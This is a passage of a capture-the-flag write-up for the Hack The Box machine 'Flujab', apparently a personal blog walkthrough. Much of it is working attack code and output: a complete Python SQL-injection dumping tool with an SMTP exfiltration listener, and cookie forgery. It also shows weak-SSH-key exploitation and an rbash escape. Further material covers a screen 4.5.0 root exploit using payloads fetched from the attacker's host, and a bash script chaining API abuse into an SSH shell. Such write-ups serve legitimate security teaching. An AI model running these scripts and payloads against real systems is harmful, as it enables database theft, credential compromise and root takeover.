There are similar queries I can do for columns within a table, and the data in the tables. But the database is clearly large, so I’m going to script this. When I write scripted shells for hosts I do it after I’ve already really achieved what I’m going for, just as good practice. But in this case, I really did this while working on the box to allow me to enumerate this database.

I’ll outline the major parts of the script in this post. At the highest level, my script will have two threads:
1. An SMTP server listening for emails, processing them to get the part I care about, and printing it to the screen.
2. A command prompt loop that will take input and submit POST requests to the cancel page with SQL injections.

One of the challenges that comes with this kind of implementation is how to know when you’re done looping. This requires either communication between threads (which may be possible, leave a comment if you have good suggestions on how), or that I handle extra data gracefully. I went with the later, having it print onto the same line, and allowing the user to exit with `ctrl-c`.

#### SMTP Server

For the SMTP server, I’ll start with my dummy server I was already using:

```

#!/usr/bin/env python

import smtpd
import asyncore

server = smtpd.DebuggingServer(('0.0.0.0', 25), None)

asyncore.loop()

```

First, instead of using the built in `DebuggingServer` class, I’ll create a new class as a child of `smtpd.SMTPServer` where I’ll overwrite the `process_message` function. So my class will inherit all of the functionality of `SMTPServer`, except I’ll change that one function, which [the docs](https://docs.python.org/3/library/smtpd.html) say is called when an email is received. My class looks like:

```

pattern = re.compile("Subject: Flu Jab Appointment - Ref:(.*)\nMessage-ID", re.DOTALL)

class CustomSMTPServer(smtpd.SMTPServer):

    def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):
        res = re.search(pattern, data.decode('utf-8')).group(1)
        if res == "":
             sys.stdout.write("Data is done\r")
             sys.stdout.flush()
        else:
            print(res)
            
server = CustomSMTPServer(('0.0.0.0', 25), None)

loop_thread = threading.Thread(target=asyncore.loop, name="Asyncore Loop")
loop_thread.daemon = True
loop_thread.start()

```

This class simply takes each message, uses regex to get the injection result, and then prints it. If the result is nothing, it prints “Data is done” over and over on the same line, as to not fill the screen with empty lines. The next prompt will also overwrite that message.

#### CMD Loop

Now I’ll use the python `cmd` module to create a terminal into which I can enter commands. I’ll do that by creating a `Terminal` class that subclasses `Cmd`. I’ll define the prompt in such a way that it clears the current line and then starts over it. I’ll also use the `__init__` function to get the cookies I need to interact with the cancellation page:

```

class Terminal(Cmd):
    prompt = " "*50 + "\r> "

    def __init__(self):
        self.sleep_time = 0.2 
        resp = requests.get('https://freeflujab.htb', verify=False)
        self.patient = re.search(r'Patient=([a-f0-9]{32});', resp.headers['Set-Cookie']).group(1)
        self.registered = re.search(r'Registered=(.*?); ', resp.headers['Set-Cookie']).group(1)
        self.registered = urllib.parse.quote(base64.b64encode(base64.b64decode(urllib.parse.unquote(self.registered)).decode().replace("Null","True").encode()))
        Cmd.__init__(self)

```

Now I can create a function that will send my SQL inject:

```

    def make_request(self, arg):
        cookies = dict(Patient=self.patient, Registered=self.registered)
        data = {"nhsnum": arg, "submit": "Cancel+Appointment"}
        burp = {'https':'https://127.0.0.1:8080'}

        while True:
            try:
                resp = requests.post('https://freeflujab.htb/?cancel', verify=False,
                        cookies=cookies, data=data, proxies=burp)
                break
            except (requests.exceptions.SSLError, requests.exceptions.ConnectionError):
                print("Error - retrying")
                sleep(0.2)

```

Everything I’m going to run is going to loop over something, be it dbs or tables or columns or rows. Next I’m going to create a function that handles looping over some number of items. This function requires an injection string with an `{i}` in the place the caller wants to loop over.

```

    def dump(self, inject_args, args):
        try:
            num = int(args)
        except (TypeError, ValueError):
            default_num = 10
            print(f"Unable to read number. Will use default, {default_num}")
            num = default_num
        for i in range(num):
            self.make_request(inject_args.format(i=i))
            sleep(self.sleep_time)

```

Unfortunately, since I didn’t figure out how to have the SMTP thread tell the cmd thread that it’s received the end of the data, the `dump` functions requires the user provide the number they want to dump. I’ve done some tricks with the output to at least not print empty rows. I also added a neat trick that will catch a `ctrl-c` and use that to kill the current loop inside cmd.

Now I can create some functions that dump things. Each just needs to create the query that it wants to iterate over, with an `{i}` in the limit. For example, `dump_dbs` using the query demoed above:

```

    def do_dump_dbs(self, args):
        'Usage: dump_dbs [num dbs]'
        self.dump("' UNION select 1,2,TABLE_SCHEMA,4,5 FROM INFORMATION_SCHEMA.COLUMNS LIMIT {i},1; -- -", args)

```

One neat thing about the cmd class is that if I include a docstring (a string just under the function def), that will become the help inside the terminal:

```

> help                                            

Documented commands (type help <topic>):
========================================
dump_columns  dump_data  dump_dbs  dump_tables  exit  help  raw  union

> help dump_dbs                                   
Usage: dump_dbs [num dbs]

```

I’ll also add in commands that allow me to send a raw request with whatever I specify as NHS number, and one that allows me to do one off union injection without looping. And, I’ll need an exit function since I hijacked `ctrl-c` for something else.

#### Final Code

A copy of this will be in [my gitlab repo](https://gitlab.com/0xdf/ctfscripts).

```

import asyncore
import base64
import re
import requests
import smtpd
import sys
import threading
import urllib.parse
from cmd import Cmd
from time import sleep
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

pattern = re.compile("Subject: Flu Jab Appointment - Ref:(.*)\nMessage-ID", re.DOTALL)

class CustomSMTPServer(smtpd.SMTPServer):

    def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):
        res = re.search(pattern, data.decode('utf-8')).group(1)
        if res == "":
             sys.stdout.write("Data is done. Ctrl-c to return to prompt\r")
             sys.stdout.flush()
        else:
            print(res)

class Terminal(Cmd):
    prompt = " "*50 + "\r> "

    def __init__(self):
        self.sleep_time = 0.2
        resp = requests.get('https://freeflujab.htb', verify=False)
        self.patient = re.search(r'Patient=([a-f0-9]{32});', resp.headers['Set-Cookie']).group(1)
        self.registered = re.search(r'Registered=(.*?); ', resp.headers['Set-Cookie']).group(1)
        self.registered = urllib.parse.quote(base64.b64encode(base64.b64decode(urllib.parse.unquote(self.registered)).decode().replace("Null","True").encode()))
        Cmd.__init__(self)

    def make_request(self, arg):
        cookies = dict(Patient=self.patient, Registered=self.registered)
        data = {"nhsnum": arg, "submit": "Cancel+Appointment"}
        burp = {'https': 'https://127.0.0.1:8080'}

        while True:
            try:
                resp = requests.post('https://freeflujab.htb/?cancel', verify=False,
                        cookies=cookies, data=data, proxies=burp)
                break
            except (requests.exceptions.SSLError, requests.exceptions.ConnectionError):
                print("Error - retrying")
                sleep(self.sleep_time)

    def do_dump_dbs(self, args):
        'Usage: dump_dbs [num dbs]'
        self.dump("' UNION select 1,2,TABLE_SCHEMA,4,5 FROM INFORMATION_SCHEMA.COLUMNS LIMIT {i},1; -- -", args)

    def do_dump_tables(self, args):
        'Usage: dump_data [db] [num rows]'
        args = args.split(' ')
        if len(args) < 2:
            print("Usage: dump_data [db] [num rows]")
            return
        self.dump(f"' UNION select 1,2,CONCAT(TABLE_SCHEMA,':',TABLE_NAME),4,5 FROM INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = '{args[0]}' LIMIT ,1; -- -", args[1])

    def do_dump_columns(self, args):
        'Usage: dump_data [db] [table] [num rows]'
        args = args.split(' ')
        if len(args) < 3:
            print("Usage: dump_data [db] [table] [num rows]")
            return
        self.dump(f"' UNION select 1,2,CONCAT(TABLE_NAME,':',COLUMN_NAME),4,5 FROM INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = '{args[0]}' and TABLE_NAME = '{args[1]}' LIMIT ,1; -- -", args[2])

    def do_dump_data(self, args):
        'Usage: dump_data [db].[table] [columns] [num rows]'
        args = args.split(' ')
        if len(args) != 3:
            print("Usage: dump_data [db].[table] [columns] [num rows]")
            print("       columns are separated by :, no space")
            return
        cols = args[1].split(':')
        if len(cols) > 1:
            args[1] = "CONCAT(" + ",':',".join(cols) + ")"
        self.dump(f"' UNION select 1,2,{args[1]},4,5 FROM {args[0]} LIMIT ,1; -- -", args[2])

    def dump(self, inject_args, args):
        try:
            num = int(args)
        except (TypeError, ValueError):
            default_num = 10
            print(f"Unable to read number. Will use default, {default_num}")
            num = default_num
        for i in range(num):
            self.make_request(inject_args.format(i=i))
            sleep(self.sleep_time)

    def do_union(self, args):
        'Send request with UNION; provide column, table (or db.table), and offset'
        args = args.split(' ')

        if len(args) == 1:
            inject = f"' UNION select 1,2,{args[0]},4,5; -- -"
        elif len(args) == 2:
            inject = f"' UNION select 1,2,{args[0]},4,5 FROM {args[1]} LIMIT 1; -- -"
        elif len(args) == 3:
            inject = f"' UNION select 1,2,{args[0]},4,5 FROM {args[1]} LIMIT {args[2]},1; -- -"
        else:
            print("Usage: union column [table] [offset]")

        self.make_request(inject)

    def do_raw(self, args):
        'Send raw argument'
        self.make_request(args)

    def do_exit(self, args):
        'exit'
        sys.exit()

    def cmdloop(self):
        while True:
            try:
                super(Terminal, self).cmdloop(intro="")
                break
            except KeyboardInterrupt:
                sys.stdout.write(" "*50 + "\r")
                sys.stdout.flush()
                sleep(1)

server = CustomSMTPServer(('0.0.0.0', 25), None)

loop_thread = threading.Thread(target=asyncore.loop, name="Asyncore Loop")
loop_thread.daemon = True
loop_thread.start()

term = Terminal()
term.cmdloop()

```

In action, this is what it looks like:

![](https://0xdfimages.gitlab.io/img/flujab_sql.gif)

### Data

After significant enumeration of this database, I found something interesting:

```

> dump_tables vaccinations 100
vaccinations:admin
vaccinations:admin_attribute
...[snip]...
> dump_columns vaccinations admin 100    
admin:id           
admin:loginname                            
admin:namelc                             
admin:email                                                     
admin:access                                    
admin:created
admin:modified
admin:modifiedby
admin:password
admin:passwordchanged
admin:superuser
admin:disabled
admin:privileges

> dump_data vaccinations.admin loginname:access:password 2
sysadm:sysadmin-console-01.flujab.htb:a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602

```

That hash breaks in [crackstation](https://crackstation.net/):

![1549368404382](https://0xdfimages.gitlab.io/img/1549368404382.png)

Now I have a username (sysadm), password (th3doct0r), and host (sysadmin-console-01.flujab.htb).

## Shell as drno

### Access Ajenti

Visiting the host from the database on 443 just takes me to the ClownWare page not found page. If I visit on 8080, what comes up depends on my interactions with the whitelist from freeflujab.htb. If it’s been a while, the response redirects to `https://clownware.htb/cwerror_denied.php` displaying:

![](https://0xdfimages.gitlab.io/img/flujab-denied.gif)

This is at least different. I’ll remember the reference to the whitelist for sysadmins on the `/?smtp_config` page:

![1560542971124](https://0xdfimages.gitlab.io/img/1560542971124.png)

That links leads to `/?whitelist`, which redirects back to `/?denied` if I don’t have the `Modus` cookie set to allow, just like `/?smtp_config`. Before I change the SMTP settings, the whitelist is empty:

![1560543290823](https://0xdfimages.gitlab.io/img/1560543290823.png)

But after I change the SMTP to my IP, it shows up in the whitelist as well:

![1560543103368](https://0xdfimages.gitlab.io/img/1560543103368.png)

Then, on visiting https://sysadmin-console-01.flujab.htb:8080/ now, I’m redirected to an Ajenti login page:

![1560544196818](https://0xdfimages.gitlab.io/img/1560544196818.png)

And I can log in with the creds from the db, sysadm / th3doct0r:

![1560544753392](https://0xdfimages.gitlab.io/img/1560544753392.png)

### Enumeration via Ajenti

Inside the Ajenti app, I can see all sorts of things about the system. The most useful tool is `Notepad` , which lets me directory walk and open some files:

![1560545007989](https://0xdfimages.gitlab.io/img/1560545007989.png)

Other’s I don’t have permission to open:

![1560545073628](https://0xdfimages.gitlab.io/img/1560545073628.png)

### SSH Deprecated Key

#### drno

Looking through the home directories, there’s a bunch of doctors and nurses (this image shows only some):

![1560545206708](https://0xdfimages.gitlab.io/img/1560545206708.png)

sysadm is also there. In `drno`, there is also a `.ssh` directory, with `authorized_keys` and `userkey`. I can download the key, and crack it with `hashcat` (password “shadowtroll”), but the private key doesn’t pair with the public key in `authorized_keys`.

#### SSH Deprecated Keys

In `/etc/ssh`, there’s a few files that prove interesting. First, there’s a folder called `deprecated_keys`, with some public keys, and a `README.txt`:

![1560545485018](https://0xdfimages.gitlab.io/img/1560545485018.png)

`README.txt` says:

```

Copies of compromised keys will be kept here for comparison until all staff 
have carried out PAM update as per the surgery security notification email.

!!! DO NOT RE-USE ANY KEYS LINKED TO THESE !!! 

UPDATE..
All bad priv keys have now been deleted, only pub keys are retained 
for audit purposes.

```

Looking at the individual keys, I’ll see that `0223269.pub` matches the key from the `authorized_keys` file in the `drno` home directory.

```

ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5/S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9/v+k/KkpDJndEkyV7ka/r/IQP4VoCMQnDpCUwRCNoRb/kwqOMz8ViBEsg7odof7jjdOlbBz/F9c/s4nbS69v1xCh/9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ/yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ/15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot/Ma1k3izKDDTh2mVLehsivWBVI3a/Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE= drno@flujab.htb

```

#### CVE-2008-0166

In 2008, researches discovered that the version of [OpenSSL being distributed with Debian was using a bad random number generator](https://nvd.nist.gov/vuln/detail/CVE-2008-0166). This means that ssh keys generated with this version are predictable. The box is running Debian, as I can see in `/etc/issue`:

```

Debian GNU/Linux 9 \n \l

```

I’ll copy the public key to my local host, and see if it is one of the vulnerable keys. First, I’ll get the fingerprint of the key:

```

root@kali# ssh-keygen -l -f id_rsa_flujab_drno.pub -E md5
4096 MD5:de:ad:0b:5b:82:9e:a2:e3:d2:2f:47:a7:cb:de:17:a6 no comment (RSA)

```

I actually need it slightly reformatted:

```

root@kali# ssh-keygen -l -f id_rsa_flujab_drno.pub -E md5 | cut -d: -f2- | cut -d' ' -f1 | tr -d ':'                                                                              
dead0b5b829ea2e3d22f47a7cbde17a6

```

Now I’ll check out [g0tmi1k’s GitHub repo for this vuln](https://github.com/g0tmi1k/debian-ssh). I have a 4096 byte key. those are in `/opt/debian-ssh/uncommon_keys/rsa/4096`. I’ll check for it:

```

root@kali:/opt/debian-ssh/uncommon_keys# ls rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6*
rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269  rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269.pub

```

Now I have the keys. I’ll use that private key to log in. But it fails:

```

root@kali# ssh -i ~/id_rsa_flujab_drno drno@10.10.10.124
ssh_exchange_identification: read: Connection reset by peer

```

This reminds me of the enumeration section where `nmap` didn’t find any version inform.

I can run with `-v` to see it fails very early in the connection:

```

root@kali# ssh -v -i ~/id_rsa_flujab_drno drno@10.10.10.124
OpenSSH_7.9p1 Debian-10, OpenSSL 1.1.1b  26 Feb 2019
debug1: Reading configuration data /root/.ssh/config
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: Applying options for *
debug1: Connecting to 10.10.10.124 [10.10.10.124] port 22.
debug1: Connection established.
debug1: identity file /root/id_rsa_flujab_drno type -1
debug1: identity file /root/id_rsa_flujab_drno-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_7.9p1 Debian-10
ssh_exchange_identification: read: Connection reset by peer

```

### TCP Wrapper

There was another file that was interesting in the `/etc/ssh` directory, and that was `sshd_wl`. It turns out this is actually a symlink to `/etc/hosts.allow`, which is part of [TCP Wrapper](https://www.akadia.com/services/ssh_tcp_wrapper.html).

When a client connects over ssh, it checks the `hosts.allow` file to see if the IP of the client is in the file, and if so, allows it. If not, it continues to check other things, but practically speaking for this host, it denies the connection.

The file has a comment with the format to use to add my host, which I’ll do:

```

# grant ssh access per host
# syntax:
# sshd : [host ip]
###########################
sshd: 10.10.14.8

```

It is critical to have an empty line at the end of this file, or it will not work (this cost me *hours*).

### Restricted Shell

Once I save `hosts.allow`, I can ssh in again, and get a shell:

```

root@kali# ssh -i ~/id_rsa_flujab_drno drno@10.10.10.124
Linux flujab 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
rbash: dircolors: command not found
drno@flujab:~$ id
uid=1000(drno) gid=1000(drno) groups=1000(drno),1002(super),1003(medic),1004(drugs),1005(doctor)

```

And grab `user.txt`:

```

drno@flujab:~$ cat user.txt 
c519aa2f...

```

But I’m in an `rbash` restricted shell:

```

drno@flujab:~$ cd /
rbash: cd: restricted

```

### Escape

#### make

I can hit `tab tab` to list possible commands:

```

drno@flujab:~$
Display all 223 possibilities? (y or n)
:                               complete                        fgrep                           mapfile                         screen                          true
!                               compopt                         fi                              mkdir                           sed                             type
./                              continue                        findmnt                         mknod                           select                          typeset
[                               coproc                          for                             mktemp                          set                             udevadm
[[                              cowsay                          fortune                         more                            setfont                         ulimit
]]                              cowthink                        function                        mount                           setupcon                        umask
{                               cp                              fuser                           mountpoint                      sh                              umount
}                               cpio                            getopts                         mt                              sh.distrib                      unalias
alias                           dash                            grep                            mt-gnu                          shift                           uname
bash                            date                            gunzip                          mv                              shopt                           uncompress
bg                              dd                              gzexe                           nano                            sleep                           unicode_start
bind                            declare                         gzip                            netstat                         source                          unset
break                           df                              hash                            networkctl                      ss                              until
builtin                         dir                             help                            nisdomainname                   stty                            vdir
bunzip2                         dirs                            history                         open                            su                              vi
busybox                         disown                          hostname                        openvt                          suspend                         vim
bzcat                           dmesg                           id                              perl                            sync                            wait
bzcmp                           dnsdomainname                   if                              php                             systemctl                       wdctl
bzdiff                          do                              in                              pidof                           systemd                         which
bzegrep                         domainname                      ip                              ping                            systemd-ask-password            while
bzexe                           done                            jobs                            ping4                           systemd-escape                  who
bzfgrep                         dumpkeys                        journalctl                      ping6                           systemd-hwdb                    whoami
bzgrep                          echo                            kbd_mode                        popd                            systemd-inhibit                 ypdomainname
bzip2                           egrep                           kill                            printf                          systemd-machine-id-setup        zcat
bzip2recover                    elif                            kmod                            ps                              systemd-notify                  zcmp
bzless                          else                            last                            pushd                           systemd-sysusers                zdiff
bzmore                          emacs                           less                            pwd                             systemd-tmpfiles                zegrep
caller                          enable                          let                             python                          systemd-tty-ask-password-agent  zfgrep
case                            env                             ln                              rbash                           tailf                           zforce
cat                             esac                            loadkeys                        read                            tar                             zgrep
cd                              eval                            local                           readarray                       tempfile                        zless
chgrp                           exec                            login                           readlink                        test                            zmore
chmod                           exit                            loginctl                        readonly                        then                            znew
chown                           export                          logout                          return                          time
chvt                            false                           ls                              rm                              times
clear_console                   fc                              lsblk                           rmdir                           top
command                         fg                              lsmod                           rnano                           touch
compgen                         fgconsole                       make                            run-parts                       trap

```

most are overwritten to just echo “No…”:

```

drno@flujab:~$ which
No...
drno@flujab:~$ bash
No...

```

`make` isn’t:

```

drno@flujab:~$ make
make: *** No targets specified and no makefile found.  Stop.

```

I’ll check [gtfobins](https://gtfobins.github.io/gtfobins/make/#shell), and there’s an escape:

```

drno@flujab:~$ COMMAND='/bin/bash'
drno@flujab:~$ make -s --eval=$'x:\n\t-'"$COMMAND"
bash: dircolors: command not found
drno@flujab:~$ cd ..

```

I’ll need to fix the path:

```

drno@flujab:~$ hostname
No...
drno@flujab:~$ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
drno@flujab:~$ hostname
flujab

```

#### -t bash

Alternatively, I can just add `-t bash` when I `ssh` in:

```

root@kali# ssh -i ~/id_rsa_flujab_drno drno@10.10.10.124 -t bash
drno@flujab:~$ cd ..
drno@flujab:/home$

```

I’ll still need to set the `PATH`.

## Priv: drno –> root

### Enumeration

I’ll take a look at SUID binaries:

```

drno@flujab:~$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-x 1 root root 440728 Aug 21 04:14 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Mar  2  2018 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 1543016 Nov 27 13:49 /usr/local/share/screen/screen
-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn
-rwSr-xr-x 1 root utmp 457608 Dec  9 22:02 /usr/bin/screen
-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 140944 Jun  5  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount
-rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping

```

`screen` is interesting for three reasons:
1. There are two different copies, both setuid
2. One is from the same day as `user.txt`:

   ```

   drno@flujab:~$ ls -l user.txt 
   -r-------- 1 drno drno 33 Nov 27 19:05 user.txt

   ```
3. It was one of the legit binaries in `/usr/rbin/`, which drew my attention to it:

   ```

   drno@flujab:~$ ls -l /usr/rbin/screen 
   lrwxrwxrwx 1 root root 15 Dec  9 21:18 /usr/rbin/screen -> /usr/bin/screen

   ```

If I look at the versions, I’ll find both are the same:

```

drno@flujab:~$ /usr/local/share/screen/screen --version
Screen version 4.05.00 (GNU) 10-Dec-16
drno@flujab:~$ /usr/bin/screen --version
Screen version 4.05.00 (GNU) 10-Dec-16

```

If I try to run the one in my path, I’ll find it can’t start:

```

drno@flujab:~$ screen
Directory '/run/screen' must have mode 755.

```

From the `screen` man page:

> The “socket directory” defaults either to $HOME/.screen or simply to /tmp/screens or preferably to /run/screen chosen at compile-time. If screen is installed setuid-root, then the administrator should compile screen with an adequate (not NFS mounted) socket directory. If screen is not running setuid-root, the user can specify any mode 700 directory in the environment variable $SCREENDIR.

So the location of this directory is set at compile time. I can’t change permissions on `/run/screen`. I could set the `$SCREENDIR` variable, but that would only work if it’s not running as setuid-root. So this `screen` is a dead end.

The other, however, works fine, and creates a folder in `/tmp` owned by root:

```

drno@flujab:~$ /usr/local/share/screen/screen
[screen is terminating]
drno@flujab:~$ ls -l /tmp/
total 4
drwxr-xr-x 3 root drno 4096 Feb  6 22:51 screens

```

### Vulnerability

There is an exploit in `screen` 4.5.0 that will give a root execution if the binary is SUID (which it is by default) originally [filed as a bug here](https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html). The bug is that this version of `screen` will write a logfile with full root priv, and this works even if the log file is specified by the user. Basically, this gives the attacker arbitrary write as root.

[This repo](https://github.com/XiphosResearch/exploits/tree/master/screen2root) has code to exploit this vulnerability. It is a shell script that manages to write two c programs, compile them, one into a library and one into a shell. This host doesn’t have `gcc` or `cc`, at least not in the current path:

```

root@flujab:/root# which {g,}cc

```

So I’ll compile the binaries on my host. First, I’ll copy the two sections that the script writes to c files into their own files, `libhax.c` and `rootshell.c`. Then I’ll compile them using instructions similar to what’s in the script (I can safely ignore the warnings):

```

root@kali# gcc rootshell.c -o rootshell
...[snip]...
root@kali# gcc -fPIC -shared -ldl -o libhax.so libhax.c
...[snip]...

```

Now, serving the files with `python3 -m http.server 80`, I’ll move these to target and drop them in `/tmp`:

```

drno@flujab:/tmp$ wget 10.10.14.8/rootshell
--2019-02-06 23:47:49--  http://10.10.14.8/rootshell
Connecting to 10.10.14.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16824 (16K) [application/octet-stream]
Saving to: ‘rootshell’

rootshell                                            100%[======================================================================================================================>]  16.43K  --.-KB/s    in 0.02s   

2019-02-06 23:47:49 (977 KB/s) - ‘rootshell’ saved [16824/16824]

drno@flujab:/tmp$ wget 10.10.14.8/libhax.so
--2019-02-06 23:47:57--  http://10.10.14.8/libhax.so
Connecting to 10.10.14.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16136 (16K) [application/octet-stream]
Saving to: ‘libhax.so’

libhax.so                                            100%[======================================================================================================================>]  15.76K  --.-KB/s    in 0.02s   

2019-02-06 23:47:57 (774 KB/s) - ‘libhax.so’ saved [16136/16136]

drno@flujab:/tmp$ ls
libhax.so  rootshell

```

### Exploit

Now I can run the commands from the script, making sure to use the full path to the good `screen` each time:

```

drno@flujab:/tmp$ ls
libhax.so  rootshell
drno@flujab:/tmp$ cd /etc
drno@flujab:/etc$ umask 000
drno@flujab:/etc$ /usr/local/share/screen/screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
drno@flujab:/etc$ /usr/local/share/screen/screen -ls
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-drno.

drno@flujab:/etc$ /tmp/rootshell 
# id
uid=0(root) gid=0(root) groups=0(root),1000(drno),1002(super),1003(medic),1004(drugs),1005(doctor)

```

The printing of “[+] done!” shows that the exploit worked. I’ll go more in to what this set of commands is doing and why it works in [Beyond Root](#screen-exploit-details).

For now, I’ll grab the root flag:

```

root@flujab:/etc# cat /root/root.txt 
7081748f...

```

## Beyond Root

### Unintended Shell / Auto Shell Script

From my access into Ajenti, there’s an unintended path which gives me a shell as sysadm. This is actually the way I initially solved this box, though I was confused when I got a shell and still couldn’t get `user.txt`, and then got root, and had to go back and get `user.txt` from there.

#### sshd\_conf

First, there’s one more thing to notice in `/etc/ssh/sshd_config`, and it’s this line:

```

AuthorizedKeysFile	.ssh/authorized_keys access

```

The word `access` just kind of blends in there, but it is actually defining a second file that can hold public keys. This is important, because while I can’t create folders through Ajenti, I can create this file in the sysadm home directory.

#### ssh Key Pair

So I can create a set of RSA keys with `ssh-keygen`, and upload the public key into `/home/sysadm/access`. If I try to connect, it won’t work yet.

That is because the default file permissions on the file are 666, or RW for everyone. `sshd` doesn’t trust that file because that’s too open.

#### API

In addition to the GUI, there’s an API for Ajenti. The [documentation](http://docs1.ajenti.org/en/latest/index.html) is really poor. But, I figured a bunch of it out. One of the things that can be done through the API is [chmod](http://docs.ajenti.org/en/latest/refjs/filesystem.html). One thing to note is that it expects an int, and that int should be decimal. So when most people think of 600 for `rw-------` , that’s actually 3 digits of 0-7, or base8. 6008 = 384. So I can change the permissions on that file with a `curl` command such as:

```

curl -s -k -H "Cookie: session=${cookie};" https://sysadmin-console-01.flujab.htb:8080/api/filesystem/chmod//home/sysadm/access -d '{"mode": 384}'

```

Once that’s done, I can ssh in.

#### Script

I wrote a `bash` script that will go from clean target to shell as sysadm, including logging into the site to get added to the whitelist, and then using the Ajenti API to upoad and chmod the keys. I like to use the pattern `curl command | grep -qE for result || {echo failure message and exit}`. Basically, if the grep doesn’t find a match, it will print and exit.

```

#!/bin/bash

ip=$(ip addr show tun0 | grep -oP "10\.10\.\d+\.\d+" | grep -v 255)
patient_cookie=$(echo -n ${ip} | md5sum | cut -d' ' -f1)

# add my ip to whitelist
curl -s -k https://freeflujab.htb/?smtp_config -H "Cookie: Patient=${patient_cookie}; Registered=ZDVkMjc4MjI5NTFmY2Q5ZWU4MjM4MGVhNTkzNDRiNjk9VHJ1ZQ%3D%3D; Modus=Q29uZmlndXJlPVRydWU%3D" -d "mailserver=${ip}&port=25&save=Save+Mail+Server+Config" > /dev/null

# check whitelist
curl -s -k https://freeflujab.htb/?whitelist -H "Cookie: Patient=${patient_cookie}; Registered=ZDVkMjc4MjI5NTFmY2Q5ZWU4MjM4MGVhNTkzNDRiNjk9VHJ1ZQ%3D%3D; Modus=Q29uZmlndXJlPVRydWU%3D" | grep -q ${ip} || { echo "Failed to add ${ip} to whitelist"; exit 1; }
echo "[+] Added ${ip} to whitelist"

# log into Ajenti
echo "[*] Will log into Ajenti"
echo "[*] Can take up to two minutes for whitelist to propegate"

success=false

for i in $(seq 1 20); do
    cookie=$(curl -v -s -k https://sysadmin-console-01.flujab.htb:8080/api/core/auth -d '{"mode": "normal", "password": "th3doct0r", "username": "sysadm"}' 2>&1 | grep Set-Cookie | grep -oP "[a-f0-9]{40}")
    if [[ ! -z $cookie ]]; then
        success=true
        break
    fi
    sleep 5
done

if [[ $success = false ]]; then
    echo "[-] Failed to get cookie for Ajenti login"
    exit 1
fi
echo "[+] Got session cookie: ${cookie}"

# add to /etc/hosts.allow file
curl -s -k -H "Cookie: session=${cookie};" https://sysadmin-console-01.flujab.htb:8080/api/filesystem/write//etc/hosts.allow -d "sshd: ${ip}
" | grep -qE "^null$" || { echo "[-] Upload of ip to /etc/hosts.allow failed"; exit 1; }
echo "[+] Added ${ip} to /etc/hosts.allow"

# upload public key
curl -s -k -H "Cookie: session=${cookie};" https://sysadmin-console-01.flujab.htb:8080/api/filesystem/write//home/sysadm/access -d @/root/hackthebox/flujab-10.10.10.124/id_rsa_flujab_sysadm.pub | grep -qE "^null$" || { echo "[-] Upload of public key failed"; exit 1; }
echo "[+] Uploaded private key to /home/sysadm/access"

# change permissions on file
# 600 base 8 = 384
curl -s -k -H "Cookie: session=${cookie};" https://sysadmin-console-01.flujab.htb:8080/api/filesystem/chmod//home/sysadm/access -d '{"mode": 384}' | grep -qE "^null$" || { echo "[-] chmod of public key failed"; exit 1; }
echo "[+] AuthorizedKeyFile changed to 600"

ssh -i /root/id_rsa_flujab_sysadm sysadm@10.10.10.124 -t bash

```

It runs, and gives a shell:

```

